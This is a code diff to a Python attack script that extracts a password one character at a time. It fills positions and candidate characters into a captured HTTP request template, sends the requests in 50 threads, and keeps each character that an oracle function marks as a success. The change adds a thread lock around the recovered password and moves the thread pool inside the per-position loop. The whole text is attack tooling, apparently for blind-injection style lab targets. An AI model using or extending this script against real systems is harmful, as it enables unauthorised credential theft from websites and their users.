@@ -2,6 +2,7 @@ import argparse
 import requests
 import concurrent.futures
 import time
+import threading
 
 
 def parse_request(request):
@@ -57,8 +58,9 @@ def send_req(attempt):
     tmp = request_template.replace('CLUSTER0', str(attempt[0])).replace('CLUSTER1', str(attempt[1]))
 
     if decide(tmp):
-      password[(attempt[0] - 1)] = attempt[1]
-      print(f"[+] {attempt[0]}, {attempt[1]}: SUCCESS")
+        with password_lock:
+            password[(attempt[0] - 1)] = attempt[1]
+        print(f"[+] {attempt[0]}, {attempt[1]}: SUCCESS")
     
 
 chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
@@ -77,12 +79,12 @@ if __name__ == "__main__":
     global lst
     lst = range(21)
 
+    password_lock = threading.Lock()
+    
     payload = []
     for i in range(1, 21):
-      for char in chars:
-        payload.append((i, char))
-        
-    with concurrent.futures.ThreadPoolExecutor(50) as executor:
-    executor.map(send_req, payload) 
+        payload = [(i, char) for char in chars]
+        with concurrent.futures.ThreadPoolExecutor(50) as executor:
+            executor.map(send_req, payload)
 
     print(password)
